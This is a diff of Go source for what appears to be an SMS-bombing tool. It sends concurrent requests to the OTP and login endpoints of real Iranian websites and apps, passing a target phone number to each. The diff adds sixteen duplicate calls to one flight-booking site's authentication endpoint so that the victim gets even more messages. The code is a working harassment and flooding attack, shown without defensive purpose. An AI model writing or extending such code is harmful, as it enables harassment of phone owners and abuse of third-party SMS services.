@@ -155,32 +155,81 @@ func main() {
 		}, ch)   // add site
 		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
 			"phone_number": phone,
-		}, ch)
+		}, ch)  // add site
 		go sms("https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", map[string]interface{}{
 			"phone": phone,
-		}, ch)
+		}, ch)  // add site
 		go sms("https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)  // add site
 		go sms("https://nazarkade.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"mobileNo": phone,
-		}, ch)
+		}, ch)  // add site
 		go sms("https://api.motabare.ir/v1/core/user/initial/", map[string]interface{}{
 			"mobile": phone,
-		}, ch) // chaptcha
+		}, ch)   // add site = chaptcha
 		go sms("https://api.baloan.ir/api/v1/accounts/login-otp", map[string]interface{}{
 			"phone_number": phone,
-		}, ch) // juft login
+		}, ch)   // add site = juft login
 		go sms("https://api.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
 			"cellNumber": phone,
-		}, ch)
+		}, ch)  // add site
 		go sms("https://www.e-estekhdam.com/panel/users/authenticate/start?redirect=/search", map[string]interface{}{
 			"username": phone,
-		}, ch)
+		}, ch)  // add site
 		go sms("https://emp.e-estekhdam.com/users/authenticate/start?redirect=/", map[string]interface{}{
 			"username": phone,
-		}, ch)
+		}, ch)  // add site
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch)  
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
 
+   
 
 
 
